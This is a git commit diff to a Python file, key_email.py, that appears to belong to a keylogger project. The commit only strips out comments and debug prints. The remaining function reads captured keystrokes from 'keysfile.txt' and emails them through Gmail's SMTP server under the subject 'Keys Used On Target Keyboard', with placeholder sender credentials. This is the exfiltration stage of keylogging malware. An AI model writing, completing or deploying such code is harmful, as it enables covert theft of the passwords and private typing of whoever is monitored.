3fadfff4be252c944a3af3b0b230972044fdfa12
Praneethct <39801618+Praneethct@users.noreply.github.com>
2019-09-15 03:49:08 -0400

    Update key_email.py

--- key_email.py
+++ key_email.py
@@ -10,29 +10,16 @@ def send_email():
     to_id = "enter to email address"
     password = "enter password of from email address"
 
-    #print("opening the file")
-
-    '''
-    with open("keysfile.txt") as kf:
-        msg = EmailMessage()
-        msg.set_content(kf.read())
-    '''
-
     with open("keysfile.txt") as kf:
         data = kf.read()
     kf.close
-
-    #print("contents are copied")
 
     msg = MIMEText(data)
     msg['Subject'] = Header("Keys Used On Target Keyboard")
     msg['From'] = from_id
     msg['To'] = to_id
 
-
-    #print("establishing conection")
     s = smtplib.SMTP_SSL("smtp.gmail.com", 465)#ports 465 and 587 are used for email
     s.login(from_id, password)
     s.sendmail(from_id, to_id, str(msg))
-    #print("message sent")
     s.quit()
